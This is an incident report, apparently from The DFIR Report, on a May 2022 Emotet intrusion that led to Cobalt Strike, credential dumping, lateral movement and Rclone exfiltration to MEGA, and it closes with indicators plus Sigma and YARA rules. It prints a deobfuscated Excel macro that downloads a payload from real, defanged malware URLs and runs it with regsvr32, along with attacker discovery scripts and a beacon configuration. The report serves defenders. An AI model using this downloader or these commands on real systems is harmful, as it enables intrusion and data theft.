{
    "id": "41838bc7-4cc4-4028-b5a5-66b8e0a52c50",
    "created_at": "2023-01-12T15:07:44.590069Z",
    "updated_at": "2025-03-27T02:13:31.267842Z",
    "deleted_at": null,
    "sha1_hash": "993d01337331343cb8242997fa36edaeb47da012",
    "title": "2022-09-12 - Dead or Alive- An Emotet Story",
    "authors": "",
    "file_creation_date": "2022-10-02T12:01:43Z",
    "file_modification_date": "2022-10-02T12:01:43Z",
    "file_size": 10596790,
    "plain_text": "# Dead or Alive? An Emotet Story\n\n**thedfirreport.com/2022/09/12/dead-or-alive-an-emotet-story/**\n\nSeptember 12, 2022\n\n#### In this intrusion from May 2022, we observed a domain-wide compromise that started from a malware ridden Excel document containing the never-dying malware, Emotet.\n\n The post-exploitation started very soon after the initial compromise. The threat actors began enumerating the network once Emotet deployed a Cobalt Strike beacon on the beachhead host. After three days of discovery and lateral movement, the threat actors exfiltrated sensitive data using Rclone before leaving the network.\n\n After a successful takedown thanks to Interpol and Eurojust efforts, Emotet was resurrected in November 2021 with the help of Trickbot malware. Since then, Emotet has been testing different initial access payloads while its developers were busy improving the core functionality of the actual malware. Since January 2022 we observed an increase in the activity of Cobalt Strike deployments following Emotet intrusions.\n\n In a few weeks, we’ll have another Emotet report out from June, where the intrusion used similar TTPs and ended in ransomware.\n\n## Case Summary\n\n#### Back in May, we witnessed an intrusion that started from a phishing email which included Emotet. The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework.\n\n The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months. After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers.\n\n Around 40 minutes after the initial execution, the Emotet malware started to run a new Emotet email spreader campaign. This entailed connecting to various email servers and sending new emails with attached xls and zip files. This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again.\n\n\n-----\n\n#### Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host. Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder. Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS. Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast.\n\n At 29 hours from initial access, the threat actors began their first lateral movement. This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation. From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat. Pass-the-Hash behavior was observed targeting several accounts on the lateral host. Use of Cobalt Strike’s Get-System module was also apparent via the logs.\n\n The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network. More account discovery was then observed, with queries for Domain Administrators and a backup account.\n\n At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL. Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS. After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera–for an additional means of persistence and command and control. During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.\n\n They returned the next day, at the same time as the previous day, and picked up where they left off. They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer. Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers. Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA. Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter –ignore-existing from two different hosts on the network. Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.\n\n On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT- related data from a separate server. This was the last activity we observed from this group. These cases commonly end up with ransomware in addition to data exfiltration. This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken.\n\n## Services\n\n#### We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\n We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n\n-----\n\n#### Analysis and reporting completed by @Kostastsale and @IcsNick\n\n## Initial Access\n\n\n-----\n\n#### The threat actor gained access to the environment after a user opened an Excel document and enabled macros. The document came in via email in the form of a zip file which included an xls file. Thanks for sharing @proxylife!\n\n #Emotet – epoch4/5 – Malstorm continues.\n\n Mixture of lnk files and xls files being sent. I am playing catching up updating my git with IOC's!\n\n #1 – .lnk .ps1 > .dll\n #2 – .zip > .xls > .dll\n\n IOC'shttps://t.co/tZgoqOU6Ox (e4)https://t.co/BoJWNNvbhp (e5) pic.twitter.com/GfRXjO1GF8\n\n — proxylife (@pr0xylife) May 18, 2022\n\n The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.\n\n\n-----\n\n#### To deobfuscate the document the tool xlmdeobfuscator was used with the following output.\n\n After deobfuscation and cleaned up, the code in the macro looks as follows.\n\n\n-----\n\n```\n=IF(JRSJG1<0,CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"https[:]//lopespublicidade[.]com/cgibin/e5R5oG4iEaQnxQrZDh/\",\"..\\hvxda.ocx\",0,0))\n\n\n=IF(JRSJG2<0,CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"https[:]//bosny[.]com/aspnet_client/rnMp0ofR/\",\"..\\hvxda.ocx\n\n\n=IF(JRSJG3<0,CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"http[:]//seasidesolutions[.]com/cgibin/WLoO6sEzYCJ3LTlC/\",\"..\\hvxda.ocx\",0,0))\n\n\n=IF(JRSJG4<0,CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"http[:]//borgelin[.]org/belzebub/okwRWz1C/\",\"..\\hvxda.ocx\",0\n\n\n=IF(JRSJG5<0, CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"http[:]//loa-hk[.]com/wpcontent/ffBag/\",\"..\\hvxda.ocx\",0,0))\n\n\n=IF(JRSJG6<0, CLOSE(0),)\n\n\n=EXEC(\"C:\\Windows\\System32\\regsvr32.exe ..\\hvxda.ocx\")\n\n\n=R\n\n## Execution\n\n### Emotet Execution\n\n#### The execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll . Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs.\n\n A new file is then created in C:\\%USERPROFILE%\\AppData\\Local\\ with a folder that also consists of random characters.\n\n### Cobalt Strike Execution\n\n#### The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.\n\n```\n\n-----\n\n#### Sysmon showing Emotet starting the Cobalt Strike executable.\n\n A great way to get the Malleable profile (and additional beacon config), is to use Didier Stevens’s fantastic tool 1768.py. Here, the tool is used with a process dump of the executable.\n\n\n-----\n\n## Persistence\n\n#### The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.\n\n This registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion.\n\n Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.\n\n\n-----\n\n## Privilege Escalation\n\n#### Use of Cobalt Strike’s Get-System named pipe technique was observed on the Domain Controller and other hosts to elevate to System privileges.\n\n## Defense Evasion\n\n#### Process injection was observed during the intrusion by both Emotet and Cobalt Strike. Emotet injected multiple times into svchost to execute certain functions, including discovery commands.\n\n Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process. We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.\n\n Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule.\n\n .Pid .ProcessName .CommandLine .Rule\n\n 4616 svchost.exe C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup -s CDPUserSvc win_cobalt_strike_auto\n\n\n#### 4844 svchost.exe C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup -s WpnUserService\n\n\n#### win_cobalt_strike_auto\n\n\n-----\n\n#### 10256 UOmCgbXygCe.exe “C:\\Users\\USER\\AppData\\Local\\FrlxbduRbdVAbVbS\\UOmCgbXygCe.exe” win_cobalt_strike_auto\n\n 836 svchost.exe C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p win_cobalt_strike_auto\n\n 1008 svchost.exe C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p -s LSM win_cobalt_strike_auto\n\n 9308 regsvr32.exe regsvr32 C:\\ProgramData\\1.dll win_cobalt_strike_auto\n\n 1056 svchost.exe C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p win_cobalt_strike_auto\n\n 1428 svchost.exe C:\\Windows\\system32\\svchost.exe -k ICService -p win_cobalt_strike_auto\n\n 6036 regsvr32.exe regsvr32 C:\\ProgramData\\1.dll win_cobalt_strike_auto\n\n## Credential Access\n\n#### From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host. Data observed using sysmon event id 10 shows the use of the SearchIndexer process, similar to behavior observed in a prior case, followed by known Cobalt Strike malleable profile named pipes.\n```\nEventID: 10\n\nSourceImage: C:\\Windows\\system32\\SearchIndexer.exe\n\nTargetImage: C:\\Windows\\system32\\lsass.exe\n\nGrantedAccess: 136208\n\nCallTrace:\n\nC:\\Windows\\SYSTEM32\\ntdll.dll+9d1e4|C:\\Windows\\System32\\KERNELBASE.dll+2bcbe|C:\\Program Files\\Common Files\\Microsoft\nShared\\Ink\\IpsPlugin.dll+10369|C:\\Program Files\\Common Files\\Microsoft Shared\\Ink\\IpsPlugin.dll+10b65|C:\\Program\nFiles\\Common Files\\Microsoft Shared\\Ink\\IpsPlugin.dll+8cb2|C:\\Program Files\\Common Files\\Microsoft\nShared\\Ink\\IpsPlugin.dll+53c9|C:\\Windows\\System32\\KERNEL32.DLL+17034|C:\\Windows\\SYSTEM32\\ntdll.dll+52651\nEventID: 17\n\nEventType: CreatePipe\n\nImage: C:\\Windows\\system32\\SearchIndexer.exe\n\nPipeName: \\SearchTextHarvester\n\n Shortly after the credential dump using the SearchIndexer process, the Cobalt Strike process ran Invoke-Kerberoast looking for roastable accounts within the organization.\n\n We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.\n\n```\n\n-----\n\n## Discovery\n\n#### On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.\n```\nsysteminfo\n\nipconfig /all\n\n On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host’s Windows domain.\n\n```\n\n-----\n\n```\nC:\\Windows\\system32\\cmd.exe /C net group /domain \"Domain Admins\"\n\nC:\\Windows\\system32\\cmd.exe /C net group /domain \"Enterprise Admins\"\n\nC:\\Windows\\system32\\cmd.exe /C systeminfo\n\nC:\\Windows\\system32\\cmd.exe /C net users\n\nC:\\Windows\\system32\\cmd.exe /C nltest /DOMAIN_TRUSTS\n\n#### The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller.\n\n AdFind.exe, the command-line Active Directory query tool, was run on only one of the compromised hosts via the find.bat batch script. The contents of the script are below:\n\n```\n\n-----\n\n```\nfind.exe -f \"(objectcategory=person)\" > ad_users.txt\n\nfind.exe -f \"objectcategory=computer\" > ad_computers.txt\n\nfind.exe -f \"(objectcategory=organizationalUnit)\" > ad_ous.txt\n\nfind.exe -sc trustdmp > trustdmp.txt\n\nfind.exe -subnets -f (objectCategory=subnet)> subnets.txt\n\nfind.exe -f \"(objectcategory=group)\" > ad_group.txt\n\nfind.exe -gcb -sc trustdmp > trustdmp.txt\n\necho end\n\n#### Using the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat. The batch file contained one line, which pinged a list of servers (servers.txt). The line can be seen below:\nfor /f %%i in (SERVERS.txt) do ping %%i -n 1 >> res.txt\n\n Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.\n\n## Lateral Movement\n\n#### The Cobalt Strike jump psexec (Run service EXE on the remote host) produced a 7045 System Windows event on remote hosts. Example:\n\n```\n\n-----\n\n#### Below, the network traffic shows the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access.\n\n The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.\n\n We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons. Threat actors used PTH to acquire a session with elevated user access. We observed the below logs being generated on the source host and domain controller that indicate the use of PTH.\n\n Source Host:\n\n\n-----\n\n```\nLogon Type = 9\n\nAuthentication Package = Negotiate\n\nLogon Process = seclogo\n\n- Windows EID 467\n\n#### Domain Controller:\n- Windows EID 4776\n\n You can read more about detecting “Pass-The-Hash” here by Stealthbits and here by Hausec.\n\n## Command and Control\n\n### Emotet\n\n#### In the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage.\nhttps[:]//lopespublicidade[.]com/cgi-bin/e5R5oG4iEaQnxQrZDh/\n\nhttps[:]//bosny[.]com/aspnet_client/rnMp0ofR/\n\nhttp[:]//seasidesolutions[.]com/cgi-bin/WLoO6sEzYCJ3LTlC/\n\nhttp[:]//borgelin[.]org/belzebub/okwRWz1C/\n\nhttp[:]//loa-hk[.]com/wp-content/ffBag/\n\n The second stage of Emotet has a set of hard-coded IPs that it tries to connect to after the DLL is executed.\n\n```\n\n-----\n\n```\nhxxps[://]103[.]133[.]214[.]242:8080/\n\nhxxps[://]103[.]41[.]204[.]169/\n\nhxxps[://]103[.]41[.]204[.]169:8080/\n\nhxxps[://]103[.]42[.]58[.]120/\n\nhxxps[://]103[.]42[.]58[.]120:7080/\n\nhxxps[://]103[.]56[.]149[.]105/\n\nhxxps[://]103[.]56[.]149[.]105:8080/\n\nhxxps[://]103[.]8[.]26[.]17/\n\nhxxps[://]103[.]8[.]26[.]17:8080/\n\nhxxps[://]104[.]248[.]225[.]227/\n\nhxxps[://]104[.]248[.]225[.]227:8080/\n\nhxxps[://]110[.]235[.]83[.]107/\n\nhxxps[://]110[.]235[.]83[.]107:7080/\n\nhxxps[://]116[.]124[.]128[.]206/\n\nhxxps[://]116[.]124[.]128[.]206:8080/\n\nhxxps[://]118[.]98[.]72[.]86/\n\nhxxps[://]134[.]122[.]119[.]23/\n\nhxxps[://]134[.]122[.]119[.]23:8080/\n\nhxxps[://]139[.]196[.]72[.]155:8080/\n\nhxxps[://]159[.]69[.]237[.]188/\n\nhxxps[://]175[.]126[.]176[.]79/\n\nhxxps[://]175[.]126[.]176[.]79:8080/\n\nhxxps[://]178[.]62[.]112[.]199/\n\nhxxps[://]178[.]62[.]112[.]199:8080/\n\nhxxps[://]185[.]148[.]168[.]220/\n\nhxxps[://]185[.]148[.]168[.]220:8080/\n\nhxxps[://]188[.]225[.]32[.]231/\n\nhxxps[://]188[.]225[.]32[.]231:4143/\n\nhxxps[://]190[.]90[.]233[.]66/\n\nhxxps[://]194[.]9[.]172[.]107/\n\nhxxps[://]194[.]9[.]172[.]107:8080/\n\nhxxps[://]195[.]154[.]146[.]35/\n\nhxxps[://]195[.]77[.]239[.]39/\n\nhxxps[://]195[.]77[.]239[.]39:8080/\n\nhxxps[://]196[.]44[.]98[.]190/\n\nhxxps[://]196[.]44[.]98[.]190:8080/\n\nhxxps[://]202[.]134[.]4[.]210/\n\nhxxps[://]202[.]134[.]4[.]210:7080/\n\nhxxps[://]202[.]28[.]34[.]99/\n\nhxxps[://]202[.]28[.]34[.]99:8080/\n\nhxxps[://]202[.]29[.]239[.]162/\n\nhxxps[://]203[.]153[.]216[.]46/\n\nhxxps[://]207[.]148[.]81[.]119/\n\nhxxps[://]207[.]148[.]81[.]119:8080/\n\nhxxps[://]210[.]57[.]209[.]142/\n\nhxxps[://]210[.]57[.]209[.]142:8080/\n\nhxxps[://]217[.]182[.]143[.]207/\n\nhxxps[://]36[.]67[.]23[.]59/\n\nhxxps[://]37[.]44[.]244[.]177/\n\nhxxps[://]37[.]44[.]244[.]177:8080/\n\nhxxps[://]37[.]59[.]209[.]141/\n\nhxxps[://]37[.]59[.]209[.]141:8080/\n\nhxxps[://]45[.]71[.]195[.]104:8080/\n\nhxxps[://]5[.]56[.]132[.]177:8080/\n\nhxxps[://]51[.]68[.]141[.]164:8080/\n\nhxxps[://]54[.]37[.]106[.]167:8080/\n\nhxxps[://]54[.]37[.]228[.]122/\n\nhxxps[://]54[.]38[.]143[.]246/\n\nhxxps[://]54[.]38[.]143[.]246:7080/\n\nhxxps[://]54[.]38[.]242[.]185/\n\nhxxps[://]59[.]148[.]253[.]194/\n\nhxxps[://]62[.]171[.]178[.]147:8080/\n\nhxxps[://]66[.]42[.]57[.]149/\n\nhxxps[://]68[.]183[.]91[.]111/\n\nhxxps[://]68[.]183[.]91[.]111:8080/\n\nhxxps[://]68[.]183[.]93[.]250/\n\nhxxps[://]78[.]46[.]73[.]125/\n\nhxxps[://]78[.]47[.]204[.]80/\n\nhxxps[://]85[.]214[.]67[.]203/\n\nhxxps[://]85[.]214[.]67[.]203:8080/\n\nhxxps[://]85[.]25[.]120[.]45/\n\n```\n\n-----\n\n```\nhxxps[://]87[.]106[.]97[.]83/\n\nhxxps[://]87[.]106[.]97[.]83:7080/\n\nhxxps[://]88[.]217[.]172[.]165/\n\nhxxps[://]88[.]217[.]172[.]165:8080/\n\nhxxps[://]93[.]104[.]209[.]107/\n\nhxxps[://]93[.]104[.]209[.]107:8080/\n\n### Cobalt Strike\n\n#### Emotet, later on, deployed Cobalt Strike for additional functionality.\n59.95.98.204\n\nJA3: 72a589da586844d7f0818ce684948eea\n\nJA3S: f176ba63b4d68e576b5ba345bec2c7b7\n\nCertificate: [66:f7:4c:f9:56:5d:fe:15:a6:8c:62:b9:3d:72:cb:8e:c9:e9:89:02]\n\nNot Before: 2022/05/19 12:22:46 UTC\n\nNot After: 2023/05/19 12:22:46 (UTC)\n\nIssuer Org: jQuery\n\nSubject Common: jquery.com\n\n```\n\n-----\n\n```\n \"beacontype\": [\n\n  \"HTTP\"\n\n ],\n\n \"sleeptime\": 45000,\n\n \"jitter\": 37,\n\n \"maxgetsize\": 1403644,\n\n \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n\n \"license_id\": 206546002,\n\n \"cfg_caution\": false,\n\n \"kill_date\": null,\n\n \"server\": {\n\n  \"hostname\": \"59.95.98.204\",\n\n  \"port\": 8080,\n\n  \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfWiK6EPk2D2Ho7CBgdUfK2kqa/1x2L0Tt0R4Pl/Sof+7skIOqclxG1PeQTbc0VYagoqiuCJCn/QQd8pJ\n },\n\n \"host_header\": \"\",\n\n \"useragent_header\": null,\n\n \"http-get\": {\n\n  \"uri\": \"/jquery-3.3.1.min.js\",\n\n  \"verb\": \"GET\",\n\n  \"client\": {\n\n   \"headers\": null,\n\n   \"metadata\": null\n\n  },\n\n  \"server\": {\n\n   \"output\": [\n\n    \"print\",\n\n    \"append 1522 characters\",\n\n    \"prepend 84 characters\",\n\n    \"prepend 3931 characters\",\n\n    \"base64url\",\n\n    \"mask\"\n\n   ]\n\n  }\n\n },\n\n \"http-post\": {\n\n  \"uri\": \"/jquery-3.3.2.min.js\",\n\n  \"verb\": \"POST\",\n\n  \"client\": {\n\n   \"headers\": null,\n\n   \"id\": null,\n\n   \"output\": null\n\n  }\n\n },\n\n \"tcp_frame_header\":\n\"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"crypto_scheme\": 0,\n\n \"proxy\": {\n\n  \"type\": null,\n\n  \"username\": null,\n\n  \"password\": null,\n\n  \"behavior\": \"Use IE settings\"\n\n },\n\n \"http_post_chunk\": 0,\n\n \"uses_cookies\": true,\n\n \"post-ex\": {\n\n  \"spawnto_x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n\n  \"spawnto_x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\"\n\n },\n\n \"process-inject\": {\n\n  \"allocator\": \"NtMapViewOfSection\",\n\n  \"execute\": [\n\n   \"CreateThread 'ntdll!RtlUserThreadStart'\",\n\n   \"CreateThread\",\n\n   \"NtQueueApcThread-s\",\n\n   \"CreateRemoteThread\",\n\n   \"RtlCreateUserThread\"\n\n  ],\n\n```\n\n-----\n\n```\n  \"startrwx\": false,\n\n  \"stub\": \"yl5rgAigihmtjA5iEHURzg==\",\n\n  \"transform-x86\": [\n\n   \"prepend '\\\\x90\\\\x90'\"\n\n  ],\n\n  \"transform-x64\": [\n\n   \"prepend '\\\\x90\\\\x90'\"\n\n  ],\n\n  \"userwx\": false\n\n },\n\n \"dns-beacon\": {\n\n  \"dns_idle\": null,\n\n  \"dns_sleep\": null,\n\n  \"maxdns\": null,\n\n  \"beacon\": null,\n\n  \"get_A\": null,\n\n  \"get_AAAA\": null,\n\n  \"get_TXT\": null,\n\n  \"put_metadata\": null,\n\n  \"put_output\": null\n\n },\n\n \"pipename\": null,\n\n \"smb_frame_header\":\n\"AAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"stage\": {\n\n  \"cleanup\": true\n\n },\n\n \"ssh\": {\n\n  \"hostname\": null,\n\n  \"port\": null,\n\n  \"username\": null,\n\n  \"password\": null,\n\n  \"privatekey\": null\n\n }\n\n}\n\n### Atera and Splashtop\n\n#### Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion. Atera granted the threat actors with interactive access. We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.\n\n## Exfiltration\n\n#### The threat actors used Rclone to exfiltrate sensitive data to MEGA.io cloud storage. Command line logging revealed the destination to be the Mega service and the network shares targeted.\n\n```\n\n-----\n\n```\ntransfers, 4\n\n#### This activity was also visible on the network via Zeek logs showing the SMB share connection activity.\n\n## Actions on Objectives\n\n#### Emotet has for some time been used as an initial access broker for various intrusions; however, some Emotet infections get tasked with continuing the delivery of new campaigns. In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.\n\n The Emotet mailer started roughly once each day during the intrusion. Marked by bursts of connection to various email servers.\n\n```\n\n-----\n\n#### The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access.\n\n\n-----\n\n-----\n\n#### We did not see any further activity but we believe if given enough time, this would have ended with domain wide ransomware. We have a case coming up in a few weeks where it does exactly that.\n\n## Indicators\n\n#### File:\n```\ninfo_1805.xls\n\nacd3d4e8f63f52eaf57467a76ca2389d\n\n4a42b5e7e7fd43ddefc856f45bb95d97656ddca6\n\ne598b9700e13f2cb1c30c6d9230152ed5716a6d6e25db702576fefeb6638005e\n\n1.dll\n\n27d0b9e38cdc9a31fa9271c0bbf5d393\n\ne96980812c287c9d27be9181bcf08727cc9f457a\n\n1b9c9e4ed6dab822b36e3716b1e8f046e92546554dff9bdbd18c822e18ab226b\n\nfind.bat\n\nc96b2b5b52ef0013b841d136ddab0f49\n\n22cc2bc032ae327de9f975e9122b692e4474ac15\n\n5a5c601ede80d53e87e9ccb16b3b46f704e63ec7807e51f37929f65266158f4c\n\np.bat\n\nadf2b487134ffcd7999e419318dfdf8d\n\n91c54877440d14538be22d662e7f47e29ab219bf\n\nfd72a9313f8564b57ebd18791a438216d289d4a97df3f860f1fc585a001265d9\n\nllJyMIOvft.dll\n\ne984f812689ec7af136a151a19b2d56c\n\n88591ad3806c0a1e451c744d4942e99e9a5d2ff7\n\n2b2e00ed89ce6898b9e58168488e72869f8e09f98fecb052143e15e98e5da9df\n\nUOmCgbXygCe.exe\n\n592155bbbab05ac1f818cfd9eb53b672\n\n82070d19c26e0f7e255168e1f2364174215aa0de\n\nf4c085ef1ba7e78a17a9185e4d5e06163fe0e39b6b0dc3088b4c1ed11c0d726b\n\n Network:\n\n Cobalt Strike:\n59.95.98.204:8080\nhttp://59.95.98.204:8080/jquery-3.3.1.min.js\n\n Emotet:\n103.8.26.17:8080\n134.122.119.23:8080\n54.38.143.246:7080\n202.29.239.162:443\n\n## Detections\n\n### Network\n\n#### Suricata rules:\nET DROP Spamhaus DROP Listed Traffic Inbound group 13\n\nET CNC Feodo Tracker Reported CnC Server group 9\n\nET CNC Feodo Tracker Reported CnC Server group 12\n\nET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile M2\n\nET MALWARE Cobalt Strike Beacon Activity (GET)\n\nET MALWARE Cobalt Strike Malleable C2 JQuery Custom Profile Response\n\nET MALWARE Cobalt Strike Activity (POST)\n\nET CNC Feodo Tracker Reported CnC Server group 22\n\nET POLICY SMB Executable File Transfer\n\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access\n\nET CNC Feodo Tracker Reported CnC Server group 24\n\nET MALWARE W32/Emotet CnC Beacon 3\n\n```\n\n-----\n\n### Sigma\n\n#### https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/ateraagent_malicious_installations.yml\n```\ntitle: AteraAgent malicious installations\n\nid: fb0f2d48-269d-473e-9afc-c540a16a990f\n\ndescription: Detects potentially malicious AteraAgent installations when the IntegratorLogin parameter is used to\nregister a non-business email.\n\nstatus: experimental\n\ndate: 2022/09/12\n\nauthor: '@kostastsale, @TheDFIRReport'\n\nlogsource:\n\n  category: process_creation\n\n  product: windows\n\ndetection:\n\n  selection1:\n\n    Image:\n\n     - '*\\AteraAgent.exe'\n\n    CommandLine|contains|all:\n\n     - '/i '\n\n     - 'IntegratorLogin='\n\n  selection2:\n\n    CommandLine|contains:\n\n    # Feel free to modify the email addresses to fit your needs\n\n     - '@gmail.com'\n\n     - '@hotmail.com'\n\n     - '@hotmail.com'\n\n     - '@yandex.ru'\n\n     - '@mail.ru'\n\n     - '@outlook.com'\n\n     - '@protonmail.com'\n\n     - '@dropmail.me'\n\n  condition: selection1 and selection2\n\nfalsepositives:\n\n  - Unlikely\n\nlevel: high\n\ntags:\n\n  - attack.execution\n\n  - attack.T1059.006\n\n https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rclone_smb_share_exfiltration.yml\ntitle: Rclone SMB Share Exfiltration\n\nid: 889bc648-5164-44f4-9388-fb5d6b58a7b2\n\nstatus: Experimental\n\ndescription: Detection of a exfiltration activity using rclone from Windows network shares using SMB.\n\nauthor: \\@TheDFIRReport\n\ndate: 2022/09/12\n\nreferences:\n\n - https://thedfirreport.com/\n\nlogsource:\n\n product: zeek\n\n service: smb_files\n\ndetection:\n\n selection:\n\n  file_name|endswith:\n\n   - '\\rclone.exe'\n\n condition: selection\n\nfalsepositives:\n\n - Approved business backup processes.\n\nlevel: medium\n\ntags:\n\n - attack.exfiltration\n\n - attack.t567.002\n\n https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/potential_smb_dll_lateral_movement.yml\n\n```\n\n-----\n\n```\nid: 8fe1524e-8c97-404c-9dee-090929a315c4\n\nstatus: Experimental\n\ndescription: Detection of potential us of SMB to transfer DLL's into the ProgramData folder of hosts for purposes of\nlateral movement.\n\nauthor: \\@TheDFIRReport\n\ndate: 2022/09/12\n\nreferences:\n\n - https://thedfirreport.com/\n\nlogsource:\n\n product: zeek\n\n service: smb_files\n\ndetection:\n\n selection_1:\n\n  file_name|contains:\n\n   - 'programdata'\n\n selection_2:\n\n  file_name|endswith:\n\n   - '\\.dll'\n\n condition: selection_1 and selection_2\n\nfalsepositives:\n\n - RMM Tools and Administrative activities in ProgramData Folder.\n\nlevel: medium\n\ntags:\n\n - attack.lateral_movement\n\n - attack.t1570\n\n### Yara\n\n#### https://github.com/The-DFIR-Report/Yara-Rules/blob/main/case_14335.yar\n\n```\n\n-----\n\n```\nYARA Rule Set\n\nAuthor: The DFIR Report\n\nDate: 2022-09-12\n\nIdentifier: Emotet Case 14335\n\nReference: https://thedfirreport.com\n\n*/\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\n\nrule llJyMIOvft_14335 {\n\n  meta:\n\n   description = \"llJyMIOvft.dll\"\n\n   author = \"The DFIR Report\"\n\n   reference = \"https://thedfirreport.com\"\n\n   date = 2022-09-12\"\n\n   hash1 = \"2b2e00ed89ce6898b9e58168488e72869f8e09f98fecb052143e15e98e5da9df\"\n  strings:\n\n   $s1 = \"Project1.dll\" fullword ascii\n\n   $s2 = \"!>v:\\\"6;\" fullword ascii\n\n   $s3 = \"y6./XoFz_6fw%r:6*\" fullword ascii\n\n   $s4 = \"u3!RuF%OR_O*^$nw7&<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\">\" fullword\nascii\n\n   $s5 = \"*/B+ n\" fullword ascii\n\n   $s6 = \"ZnwFY66\" fullword ascii\n\n   $s7 = \"1!f%G%w\" fullword ascii\n\n   $s8 = \"QKMaXCL6\" fullword ascii\n\n   $s9 = \"IMaRlh9\" fullword ascii\n\n   $s10 = \"_BZRDe'7&7<<!{nBLU\" fullword ascii\n\n   $s11 